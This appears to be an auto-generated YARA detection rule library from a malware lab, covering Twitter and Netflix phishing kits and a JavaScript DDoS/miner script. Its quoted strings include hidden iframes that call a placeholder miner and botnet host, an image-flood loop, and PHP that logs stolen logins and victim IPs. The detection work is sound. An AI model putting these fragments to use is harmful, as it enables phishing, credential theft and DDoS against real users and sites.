      $s2 = "'http://TARGET-SITE.com/images/header.png');" fullword ascii /* score: '27.00'*/
      $s3 = "  var TARGET = 'TARGET-SITE.com'" fullword ascii /* score: '24.00'*/
      $s4 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s5 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s6 = "  pic.src = 'http://'+TARGET+URI+rand+'=val'" fullword ascii /* score: '20.00'*/
      $s7 = "$.getScript(url2);" fullword ascii /* score: '15.00'*/
      $s8 = "$.getScript(url);" fullword ascii /* score: '15.00'*/
      $s9 = "function imgflood() {" fullword ascii /* score: '9.00'*/
      $s10 = "setInterval(imgflood, 10) //100 requests per second" fullword ascii /* score: '9.00'*/
      $s11 = "  var rand = Math.floor(Math.random() * 1000)" fullword ascii /* score: '8.00'*/
      $s12 = "  var URI = '/index.php?'" fullword ascii /* score: '7.00'*/
      $s13 = "window.setInterval(function (){" fullword ascii /* score: '7.00'*/
      $s14 = "  var pic = new Image()" fullword ascii /* score: '4.00'*/
      $s15 = "function ddos(url,url2){" fullword ascii /* score: '4.00'*/
      $s16 = "},1000)" fullword ascii /* score: '1.00'*/
   condition:
      ( ( uint16(0) == 0x640a or uint16(0) == 0x6f64 ) and filesize < 3KB and ( 8 of them )
      ) or ( all of them )
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__twitter/phish__twitter_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__twitter
   Reference: phish__twitter phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__twitter_home_ubuntu_malware_lab_samples_extracted_phishing_Twitter_malware_fake_link_master_malware_fake_link_master_index {
   meta:
      description = "phish__twitter - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__twitter phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "100f45abc517399d8d644b14e09bc34dd56fa170cbf67cac975dc46732d09c6d"
   strings:
      $s1 = "    header(\"Content-Length:\".filesize($file));" fullword ascii /* score: '15.00'*/
      $s2 = "    header(\"Content-Type: application/octet-stream\"); // application/octet-stream - application/zip" fullword ascii /* score: '13.00'*/
      $s3 = "    header(\"Content-Transfer-Encoding: Binary\");" fullword ascii /* score: '12.00'*/
      $s4 = "$file = \"some.txt\";" fullword ascii /* score: '11.00'*/
      $s5 = "    header(\"Content-Disposition: attachment; filename=\" . basename($file));" fullword ascii /* score: '9.00'*/
      $s6 = " internet explorer" fullword ascii /* score: '6.00'*/
      $s7 = "    header($_SERVER[\"SERVER_PROTOCOL\"] . \" 200 OK\");" fullword ascii /* score: '4.00'*/
      $s8 = "    header(\"Cache-Control: public\"); // " fullword ascii /* score: '3.00'*/
      $s9 = "    readfile($file);" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule Информация {
   meta:
      description = "phish__twitter - file Информация.txt"
      author = "Comps Team Malware Lab"
      reference = "phish__twitter phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "23b2b88e531c84667a585c934aefac9c6fd1b451e05c1c34866056a2b85f7abe"
   strings:
      $s1 = "https://youtu.be/6rZDZ15lak4" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0xa2d0 and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__twitter_home_ubuntu_malware_lab_samples_extracted_phishing_Twitter_index {
   meta:
      description = "phish__twitter - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__twitter phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__twitter_home_ubuntu_malware_lab_samples_extracted_phishing_Twitter_login {
   meta:
      description = "phish__twitter - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__twitter phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "39660ba1a950d9a279f9e7968ae4c2ac5b4f57a78a65267c6153b5f9ce11463b"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['usernameOrEmail'] . \" Pass: \" . $_POST['pass'] . \"\\n\", FILE_AP" ascii /* score: '24.00'*/
      $s2 = "header('Location: https://twitter.com/');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__twitter_home_ubuntu_malware_lab_samples_extracted_phishing_Twitter_login_2 {
   meta:
      description = "phish__twitter - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__twitter phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "f4c0ece762ccc9cc12861b7d39265f9f61d0abf95a2854158309e94371098f64"
   strings:
      $x1 = "      <input type=\"hidden\" id=\"init-data\" class=\"json-data\" value=\"{&quot;keyboardShortcuts&quot;:[{&quot;name&quot;:&quo" ascii /* score: '45.00'*/
      $x2 = "    !function(){function e(e){if(e||(e=window.event),!e)return!1;if(e.timestamp=(new Date).getTime(),!e.target&&e.srcElement&&(e" ascii /* score: '34.00'*/
      $x3 = "ter.com/login?lang=gl\"><link rel=\"alternate\" hreflang=\"ro\" href=\"https://twitter.com/login?lang=ro\"><link rel=\"alternate" ascii /* score: '31.00'*/
      $x4 = "    <noscript><meta http-equiv=\"refresh\" content=\"0; URL=https://mobile.twitter.com/i/nojs_router?path=%2Flogin\"></noscript>" ascii /* score: '31.00'*/
      $s5 = " hreflang=\"sr\" href=\"https://twitter.com/login?lang=sr\"><link rel=\"alternate\" hreflang=\"sk\" href=\"https://twitter.com/l" ascii /* score: '28.00'*/
      $s6 = "ng=\"hr\" href=\"https://twitter.com/login?lang=hr\"><link rel=\"alternate\" hreflang=\"en-gb\" href=\"https://twitter.com/login" ascii /* score: '28.00'*/
      $s7 = "=sk\"><link rel=\"alternate\" hreflang=\"gu\" href=\"https://twitter.com/login?lang=gu\"><link rel=\"alternate\" hreflang=\"mr\"" ascii /* score: '28.00'*/
      $s8 = " href=\"https://twitter.com/login?lang=zh-cn\"><link rel=\"alternate\" hreflang=\"hi\" href=\"https://twitter.com/login?lang=hi" ascii /* score: '28.00'*/
      $s9 = "s://twitter.com/login?lang=mr\"><link rel=\"alternate\" hreflang=\"ta\" href=\"https://twitter.com/login?lang=ta\"><link rel=\"a" ascii /* score: '28.00'*/
      $s10 = "hreflang=\"pt\" href=\"https://twitter.com/login?lang=pt\"><link rel=\"alternate\" hreflang=\"ko\" href=\"https://twitter.com/lo" ascii /* score: '28.00'*/
      $s11 = "://twitter.com/login?lang=ru\"><link rel=\"alternate\" hreflang=\"nl\" href=\"https://twitter.com/login?lang=nl\"><link rel=\"al" ascii /* score: '28.00'*/
      $s12 = "//twitter.com/login?lang=it\"><link rel=\"alternate\" hreflang=\"id\" href=\"https://twitter.com/login?lang=id\"><link rel=\"alt" ascii /* score: '28.00'*/
      $s13 = "rel=\"alternate\" hreflang=\"no\" href=\"https://twitter.com/login?lang=no\"><link rel=\"alternate\" hreflang=\"sv\" href=\"http" ascii /* score: '28.00'*/
      $s14 = "reflang=\"ja\" href=\"https://twitter.com/login?lang=ja\"><link rel=\"alternate\" hreflang=\"es\" href=\"https://twitter.com/log" ascii /* score: '28.00'*/
      $s15 = "\"da\" href=\"https://twitter.com/login?lang=da\"><link rel=\"alternate\" hreflang=\"pl\" href=\"https://twitter.com/login?lang=" ascii /* score: '28.00'*/
      $s16 = "ng=ms\"><link rel=\"alternate\" hreflang=\"zh-tw\" href=\"https://twitter.com/login?lang=zh-tw\"><link rel=\"alternate\" hreflan" ascii /* score: '28.00'*/
      $s17 = " hreflang=\"fil\" href=\"https://twitter.com/login?lang=fil\"><link rel=\"alternate\" hreflang=\"ms\" href=\"https://twitter.com" ascii /* score: '28.00'*/
      $s18 = "  <link rel=\"alternate\" hreflang=\"fr\" href=\"https://twitter.com/login?lang=fr\"><link rel=\"alternate\" hreflang=\"en\" hre" ascii /* score: '28.00'*/
      $s19 = "s\"><link rel=\"alternate\" hreflang=\"de\" href=\"https://twitter.com/login?lang=de\"><link rel=\"alternate\" hreflang=\"it\" h" ascii /* score: '28.00'*/
      $s20 = "gb\"><link rel=\"alternate\" hreflang=\"vi\" href=\"https://twitter.com/login?lang=vi\"><link rel=\"alternate\" hreflang=\"bn\" " ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x3c0a and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__twitter_home_ubuntu_malware_lab_samples_extracted_phishing_Twitter_ip {
   meta:
      description = "phish__twitter - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__twitter phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s4 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s8 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s13 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__netflix/phish__netflix_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__netflix
   Reference: phish__netflix phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__netflix_home_ubuntu_malware_lab_samples_extracted_phishing_Netflix_Netflix_files_none {
   meta:
      description = "phish__netflix - file none.css"
      author = "Comps Team Malware Lab"
      reference = "phish__netflix phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "601553a598f6c89f43b5f373d84fdf182db3af0acd6df215f9e4f62ee6c4dcb6"
   strings:
      $x1 = "body,html{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:gra" ascii /* score: '65.00'*/
      $s2 = "und-color:transparent;max-width:450px}.login-body:before{content:\"\";height:91px;display:block}.login-body:after{content:\"\";h" ascii /* score: '30.00'*/
      $s3 = "y-phone .phone-image{background:url(https://assets.nflxext.com/ffe/siteui/login/images/phone_red@2x.png);-moz-background-size:co" ascii /* score: '28.00'*/
      $s4 = "nd:url(https://assets.nflxext.com/ffe/siteui/login/images/phone_red.png);-moz-background-size:contain;background-size:contain;wi" ascii /* score: '28.00'*/
      $s5 = "100%}@media only screen and (min-width:740px){body,html{background:url(https://assets.nflxext.com/ffe/siteui/acquisition/login/l" ascii /* score: '28.00'*/
      $s6 = "ogin .login-input-email,.sms-login .login-input-password.ui-label{padding-bottom:25px}.sms-login .sign-in-header{color:#000;font" ascii /* score: '27.00'*/
      $s7 = "login{padding-bottom:1px}.sms-login.login-content{position:relative;min-height:330px}.sms-login .action-container.loginEmail{mar" ascii /* score: '27.00'*/
      $s8 = "50%;background-image:url(https://assets.nflxext.com/en_us/home/ringloader_white_57x57_tail_red.gif),url(https://assets.nflxext.c" ascii /* score: '26.00'*/
      $s9 = "-top:20px;background-color:#f3f3f3}@media only screen and (min-width:740px){.login-content{padding:40px}}@media only screen and " ascii /* score: '24.00'*/
      $s10 = "(min-width:500px){.login-content{min-width:380px}}.login-body{color:#333;margin:0 auto;padding:0 5%}.login-body .decision-gate{p" ascii /* score: '24.00'*/
      $s11 = "t:236px;display:block}}@media only screen and (min-width:740px){.nfHeader.login-header.login-header{position:absolute;left:0;top" ascii /* score: '24.00'*/
      $s12 = "#appMountPoint{background-color:transparent;color:#fff}}#appMountPoint>div{height:100%;margin:0;padding:0}.login-content{padding" ascii /* score: '24.00'*/
      $s13 = "gin-top:25px}.sms-login .email-header{margin:25px auto;font-size:22px;text-align:center;display:inline-block;width:100%}.sms-log" ascii /* score: '23.00'*/
      $s14 = " .decision-gate{padding:0 2px}}@media only screen and (min-width:740px){.login-body{margin:0 auto -236px;min-height:100%;backgro" ascii /* score: '23.00'*/
      $s15 = "r .phone-header-text{width:80%;margin:0 auto}@media screen and (max-width:500px){.sms-login .email-header{font-size:22px}}.sms-l" ascii /* score: '23.00'*/
      $s16 = "-weight:300;text-align:center;font-size:32px;margin-bottom:10px}.sms-login .sign-in-header .back-btn{float:left;cursor:pointer}." ascii /* score: '23.00'*/
      $s17 = "in .phone-header{margin:0 auto 25px auto;font-size:20px;text-align:center;display:inline-block;width:97%}.sms-login .phone-heade" ascii /* score: '23.00'*/
      $s18 = "age{font-size:14px;color:grey;margin:6px 0}.sms-login .code-entry-header{text-align:center;font-size:30px;margin-bottom:10px}.sm" ascii /* score: '23.00'*/
      $s19 = "r{font-size:25px}.sms-login .email-sent-header.cell4{font-size:21px;font-weight:600}.sms-login .email-sent-info.cell4{font-size:" ascii /* score: '23.00'*/
      $s20 = ".poll-wrapper{margin-bottom:100px}.sms-login .poll-wrapper.cell4{margin-bottom:10px;margin-top:40px}.sms-login .email-sent-heade" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x6f62 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule none_002 {
   meta:
      description = "phish__netflix - file none_002.js"
      author = "Comps Team Malware Lab"
      reference = "phish__netflix phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "abfe0e1b195380596a8d28abb2d472cc1cc670ac7f8a9582ca45bf3fb1b0950f"
   strings:
      $x1 = "\":\"ss\"},Mn={\"&\":\"&amp;\",\"<\":\"&lt;\",\">\":\"&gt;\",'\"':\"&quot;\",\"'\":\"&#39;\",\"`\":\"&#96;\"},qn={\"&amp;\":\"&" ascii /* score: '86.00'*/
      $x2 = "]+$/,parens:/(\\([^\\)]*\\)|\\[[^\\]]*\\]|\\{[^}]*\\}|<[^>]*>)/g},s.defaultPorts={http:\"80\",https:\"443\",ftp:\"21\",gopher:\"" ascii /* score: '71.00'*/
      $x3 = "C.r(\"components/LayoutContext.jsx\",function(e,t,o){\"use strict\";function n(e){return l({displayName:\"LayoutContext\",contex" ascii /* score: '68.00'*/
      $x4 = "Ze=function(e,t,n){var r,i,o,a,s=e.style;return n=n||Ke(e),a=n?n[t]:void 0,null==a&&s&&s[t]&&(a=s[t]),tt.test(a)&&!nt.test(t)&&(" ascii /* score: '60.00'*/
      $x5 = ";return r=r===A?e:jo(r<0?0:+r||0,e),(r-=t.length)>=0&&n.indexOf(t,r)==r}function pi(n){return n=o(n),n&&yn.test(n)?n.replace(_n," ascii /* score: '55.00'*/
      $x6 = "return n?s.length:s?t.error(e):$(e,l).slice(0)},N=t.compile=function(e,t){var n,r=[],i=[],o=z[e+\" \"];if(!o){for(t||(t=C(e)),n=" ascii /* score: '48.00'*/
      $x7 = " \\\\t\\\\n\\\\r]\"},Ot=\"\\\\\\\\\",Mt={type:\"literal\",value:\"\\\\\\\\\",description:'\"\\\\\\\\\\\\\\\\\"'},St=function(){r" ascii /* score: '47.00'*/
      $x8 = "state.fbStatus!==b&&(u.login(this._fbLoginErrorHandler,this._fbLoginSuccessHandler.bind(this,t.target)),t.preventDefault(),t.sto" ascii /* score: '41.00'*/
      $x9 = "},t,o?r:void 0,o,null)}})}),re.fn.size=function(){return this.length},re.fn.andSelf=re.fn.addBack,\"function\"==typeof define&&d" ascii /* score: '39.00'*/
      $x10 = "props.model.templateComponent,t=i.get(this.context.models,\"loginChrome.data.showHeader\",!0),o=i.get(this.context.models,\"logi" ascii /* score: '37.00'*/
      $x11 = "me:\"icon-facebook\",src:\"https://assets.nflxext.com/ffe/siteui/login/images/FB-f-Logo__blue_57.png\"}),a.createElement(\"span" ascii /* score: '34.00'*/
      $x12 = "tflix.com\"}),dvdMdp:o({path:\"/Movie/:id\",hostname:\"dvd.netflix.com\"}),dvdUpsell:o({path:\"/SubscriptionAdd\",hostname:\"dvd" ascii /* score: '34.00'*/
      $x13 = "l:o({path:\"/SubscriptionCancel\",hostname:\"dvd.netflix.com\"})};t.exports=r});C.r(\"utils/cookieUtils.js\",function(t,e,i){\"u" ascii /* score: '33.00'*/
      $x14 = "odels.loginChrome.data.headerShowLogin\",!0),t={nfHeader:!0,noBorderHeader:this.props.noBorderHeader},s={signupBasicHeader:\"sig" ascii /* score: '33.00'*/
      $x15 = "bilityState.jsx\"),w=\"login/login\",f=i({displayName:\"Login\",contextTypes:{getI18nString:o.func.isRequired},getInitialState:f" ascii /* score: '32.00'*/
      $x16 = "ole.log(\"Sending data to server: \"+s),o&&!o.stub)o.ajax({type:\"POST\",url:a,data:s,contentType:\"application/json\",beforeSen" ascii /* score: '31.00'*/
      $s17 = "s.logEvent(\"LoggerInitialized\",{version:\"2.0.3\"})},_restore:function(t){for(var e=JSON.parse(t),i=Object.keys(e),n=0;n<i.len" ascii /* score: '30.00'*/
      $s18 = "rome.data.footerLinks\",[]),s=i.get(this.context.models,\"loginContext.data.originalPath\",null),l=i.get(this.context.models,\"s" ascii /* score: '30.00'*/
      $s19 = "napp.data.esn\"),e=s.get(this,\"context.models.flow.data.moneyballPaths.inapplogin\");this.logCL(\"signOut\"),this.props.bridge&" ascii /* score: '30.00'*/
      $s20 = "rt\"),cName:\"login-remember-me-alt\",checked:this.props.rememberMe,commonQuestionText:this.context.getI18nString(\"login/loginC" ascii /* score: '29.00'*/
   condition:
      uint16(0) == 0x2e43 and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule _opt_mal_phish__netflix_home_ubuntu_malware_lab_samples_extracted_phishing_Netflix_Netflix_files_none_2 {
   meta:
      description = "phish__netflix - file none.js"
      author = "Comps Team Malware Lab"
      reference = "phish__netflix phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "36d6338e657cdef8022ef6782c4a709216a661166abaf141cd55e9286d774fda"
   strings:
      $x1 = "!function(r){\"use strict\";function e(r,e,n){for(var i in e)!0!==n&&r.hasOwnProperty(i)||(r[i]=e[i])}var n=\"/\",i=\"node_modul" ascii /* score: '67.00'*/
      $s2 = "on(e,n){r.C.config.logger.warn(this.prepare(e,n))},error:function(e,n){r.C.config.logger.error(this.prepare(e,n))}},_createBound" ascii /* score: '24.00'*/
      $s3 = "lder.netflix.com\",TEST:\"codex-test.netflix.com\",PROD:\"codex-prod.netflix.com\",CDN:\"codex.nflxext.com\"},STACKS:{DEVELOPMEN" ascii /* score: '23.00'*/
      $s4 = "k\")),[s+(o._port?\":\"+o._port:\"\"),o._urlEncodedCodexVersion,o.constants.BASE_URL,t.namespace,t.version,t.id||t.type,t.type,o" ascii /* score: '21.00'*/
      $s5 = "AR)},_trimSlashes:function(t){return t.replace(/^\\/+|\\/+$/g,\"\")},constants:{HOST:{DEVELOPMENT:\"127.0.0.1\",PRBUILDER:\"code" ascii /* score: '20.00'*/
      $s6 = "G.CLIENT NOT SET!\");var f=new r.C.Client(l.client),u=f.getUrl({namespace:l.namespace,version:l.version,id:l.id,type:\"js\",file" ascii /* score: '18.00'*/
      $s7 = "){Codex.fetch=function(e,t){var o=document.getElementsByTagName(\"script\")[0],n=document.createElement(\"script\"),d=!1;n.src=e" ascii /* score: '18.00'*/
      $s8 = "_customHost||o.constants.HOST.CDN),e},getUrl:function(t){var o=this,e=o.constants.NONE,n=\"\",s=o._protocol+o._resolveHost(t.cdn" ascii /* score: '17.00'*/
      $s9 = "s/appViewTypes.js\"],\"shakti-platform/dist/ui/consolidatedLogging/constants/commandTypes\":[\"node_modules/shakti-platform/dist" ascii /* score: '17.00'*/
      $s10 = "consolidatedLogging/constants/commandTypes.js\"],\"shakti-platform/dist/ui/consolidatedLogging/constants/contextTypes\":[\"node_" ascii /* score: '17.00'*/
      $s11 = ",r.Codex.config={}),r.C=r.Codex,r.C.r=r.C.register,r.C.k=r.C.kickoff}(window);!function(e){\"use strict\";var s={stub:!0,logger:" ascii /* score: '17.00'*/
      $s12 = ",xstate:[\"node_modules/xstate/lib/index.js\"]},version:\"0.0.1-shakti-js-1c8ae6bf\"};e.C.shallowCopy(e.C.config,o,!0),e.C.shall" ascii /* score: '16.00'*/
      $s13 = "rty(\"prefixPath\")&&!o.hasOwnProperty(\"host\"))throw new Error(\"`prefixPath` requires `host` value!\")},t.Codex.Client.create" ascii /* score: '15.00'*/
      $s14 = "g.nmEntryPoints)return r;var t,o=this.config.nmEntryPoints,s=o[r];if(!s)return this._log.error(\"No entry points found!\",n),r;i" ascii /* score: '15.00'*/
      $s15 = "nsole};if(!e||!e.C)throw new Error(\"[Codex] Codex bootstrap not loaded!\");var o={id:\"js\",namespace:\"webui\",nmEntryPoints:{" ascii /* score: '15.00'*/
      $s16 = "ined\"!=typeof window&&(\"undefined\"==typeof global&&(window.global={}),\"undefined\"==typeof process&&(window.process={env:{}}" ascii /* score: '15.00'*/
      $s17 = "rty(\"stack\")?o.stack.toUpperCase():\"\",e._urlEncodedCodexVersion=encodeURIComponent(\"^\")+e.constants.MAJOR_VERSION_SEMVER,e" ascii /* score: '14.00'*/
      $s18 = "-ardbeg/index.js\"],\"nf-browser-info\":[\"node_modules/nf-browser-info/lib/browser.js\"],\"nf-cl-logger\":[\"node_modules/nf-cl" ascii /* score: '14.00'*/
      $s19 = "Time.js\"],\"rxjs/add/operator/scan\":[\"node_modules/rxjs/add/operator/scan.js\"],\"rxjs/add/operator/share\":[\"node_modules/r" ascii /* score: '13.00'*/
      $s20 = "LOPMENT\",PRBUILDER:\"PRBUILDER\",TEST:\"TEST\",PROD:\"PROD\"},BASE_URL:\"truthBundle\",NONE:\"none\",URL_SLASH_CHAR:\"%7C\",MAJ" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x6621 and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__netflix_home_ubuntu_malware_lab_samples_extracted_phishing_Netflix_Netflix_files_sdk {
   meta:
      description = "phish__netflix - file sdk.js"
      author = "Comps Team Malware Lab"
      reference = "phish__netflix phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d69b388d3d3c136484970f6ee5e1ebb2dfe51fbd4af2ea731d8de40cfce3816e"
   strings:
      $x1 = "__d(\"XDM\",[\"sdk.DOMEventListener\",\"DOMWrapper\",\"Flash\",\"GlobalCallback\",\"Log\",\"UserAgent_DEPRECATED\",\"emptyFuncti" ascii /* score: '56.50'*/
      $x2 = "__d(\"sdk.AppEvents\",[\"AppUserPropertyAPIBuiltinField\",\"Assert\",\"FBAppEvents\",\"sdk.Auth\",\"sdk.Event\",\"sdk.Impression" ascii /* score: '56.00'*/
      $x3 = "__d(\"sdk.XD\",[\"JSSDKXDConfig\",\"Log\",\"QueryString\",\"Queue\",\"UrlMap\",\"XDM\",\"guid\",\"isFacebookURI\",\"sdk.Content" ascii /* score: '55.00'*/
      $x4 = "__d(\"sdk.XFBML.IframeWidget\",[\"QueryString\",\"UrlMap\",\"guid\",\"insertIframe\",\"sdk.Arbiter\",\"sdk.Auth\",\"sdk.Content" ascii /* score: '54.00'*/
      $x5 = "(function(a,b){var c=a.window||a;function d(){return\"f\"+(Math.random()*(1<<30)).toString(16).replace(\".\",\"\")}function e(a)" ascii /* score: '53.00'*/
      $x6 = "__d(\"ApiClient\",[\"ApiBatcher\",\"ApiClientConfig\",\"ApiClientUtils\",\"Assert\",\"ChunkedRequest\",\"CORSRequest\",\"FlashRe" ascii /* score: '53.00'*/
      $x7 = "__d(\"sdk.UIServer\",[\"JSSDKConfig\",\"Log\",\"QueryString\",\"UrlMap\",\"createObjectFrom\",\"flattenObject\",\"guid\",\"inser" ascii /* score: '52.00'*/
      $x8 = "__d(\"sdk.Auth\",[\"sdk.Cookie\",\"sdk.createIframe\",\"DOMWrapper\",\"sdk.feature\",\"sdk.getContextType\",\"guid\",\"sdk.Impre" ascii /* score: '52.00'*/
      $x9 = "__d(\"IframePlugin\",[\"Log\",\"ObservableMixin\",\"QueryString\",\"Type\",\"UrlMap\",\"guid\",\"resolveURI\",\"sdk.Auth\",\"sdk" ascii /* score: '51.50'*/
      $x10 = "__d(\"sdk.XFBML.CustomerChat\",[\"sdk.Content\",\"sdk.DialogUtils\",\"sdk.DocumentTitle\",\"sdk.DOM\",\"sdk.DOMEventListener\"," ascii /* score: '50.00'*/
      $x11 = "__d(\"sdk.init\",[\"Log\",\"ManagedError\",\"QueryString\",\"sdk.Cookie\",\"sdk.ErrorHandling\",\"sdk.Event\",\"sdk.MBasicInitia" ascii /* score: '50.00'*/
      $x12 = "__d(\"sdk.UA\",[],(function(a,b,c,d,e,f){__p&&__p();a=navigator.userAgent;var g={iphone:/\\b(iPhone|iP[ao]d)/.test(a),ipad:/\\b(" ascii /* score: '49.00'*/
      $x13 = "__d(\"sdk.XFBML.LoginButton\",[\"IframePlugin\",\"Log\",\"sdk.Helper\",\"sdk.ui\",\"sdk.XD\"],(function(a,b,c,d,e,f,g,h,i,j,k){_" ascii /* score: '46.00'*/
      $x14 = "__d(\"FlashRequest\",[\"DOMWrapper\",\"Flash\",\"GlobalCallback\",\"QueryString\",\"Queue\"],(function(a,b,c,d,e,f,g,h,i,j,k){__" ascii /* score: '46.00'*/
      $x15 = "__d(\"FB\",[\"DOMWrapper\",\"GlobalCallback\",\"JSSDKConfig\",\"JSSDKCssConfig\",\"Log\",\"dotAccess\",\"sdk.Auth\",\"sdk.Conten" ascii /* score: '46.00'*/
      $x16 = "__d(\"sdk.XFBML.Save\",[\"IframePlugin\",\"QueryString\",\"sdk.Content\",\"sdk.createIframe\",\"sdk.DialogUtils\",\"sdk.DOM\",\"" ascii /* score: '45.00'*/
      $x17 = "__d(\"sdk.api\",[\"ApiClient\",\"sdk.feature\",\"sdk.PlatformVersioning\",\"sdk.Runtime\",\"sdk.Scribe\",\"sdk.URI\"],(function(" ascii /* score: '43.00'*/
      $x18 = "__d(\"sdk.Frictionless\",[\"sdk.api\",\"sdk.Auth\",\"sdk.Dialog\",\"sdk.Event\"],(function(a,b,c,d,e,f,g,h,i,j){__p&&__p();var k" ascii /* score: '42.00'*/
      $x19 = "__d(\"sdk.XFBML.CommentsCount\",[\"ApiClient\",\"sdk.DOM\",\"sdk.XFBML.Element\",\"Log\",\"sprintf\"],(function(a,b,c,d,e,f,g,h," ascii /* score: '41.00'*/
      $x20 = "__d(\"sdk.ui\",[\"Assert\",\"Log\",\"sdk.feature\",\"sdk.Impressions\",\"sdk.PlatformVersioning\",\"sdk.Runtime\",\"sdk.UIServer" ascii /* score: '41.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 600KB and
      1 of ($x*)
}

rule xaOI6zd9HW9 {
   meta:
      description = "phish__netflix - file xaOI6zd9HW9.html"
      author = "Comps Team Malware Lab"
      reference = "phish__netflix phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d9013ca6d10e27a1c53881852fd9bc126a0f92eb0392f7138acae4bf8947e2f3"
   strings:
      $x1 = "__d(\"XDM\",[\"sdk.DOMEventListener\",\"DOMWrapper\",\"Flash\",\"GlobalCallback\",\"Log\",\"UserAgent_DEPRECATED\",\"emptyFuncti" ascii /* score: '56.50'*/
      $x2 = "__d(\"initXdArbiter\",[\"QueryString\",\"resolveWindow\",\"Log\",\"XDM\",\"XDMConfig\"],(function(a,b,c,d,e,f){__p&&__p();(funct" ascii /* score: '48.50'*/
      $x3 = "__d(\"UserAgent_DEPRECATED\",[],(function(a,b,c,d,e,f){__p&&__p();var g=!1,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v;function w(){__p&&__p()" ascii /* score: '39.00'*/
      $x4 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"><title>Facebook Cross-Domain Messaging helper</title></he" ascii /* score: '33.00'*/
      $s5 = "__d(\"Flash\",[\"sdk.DOMEventListener\",\"DOMWrapper\",\"QueryString\",\"UserAgent_DEPRECATED\",\"guid\",\"htmlSpecialChars\"],(" ascii /* score: '29.00'*/
      $s6 = "(function(a,b){var c=a.window||a;function d(){return\"f\"+(Math.random()*(1<<30)).toString(16).replace(\".\",\"\")}function e(a)" ascii /* score: '26.00'*/
      $s7 = "Version.|.)(\\d+\\.\\d+))|(?:AppleWebKit.(\\d+(?:\\.\\d+)?))|(?:Trident\\/\\d+\\.\\d+.*rv:(\\d+\\.\\d+))/.exec(a),c=/(Mac OS X)|" ascii /* score: '24.00'*/
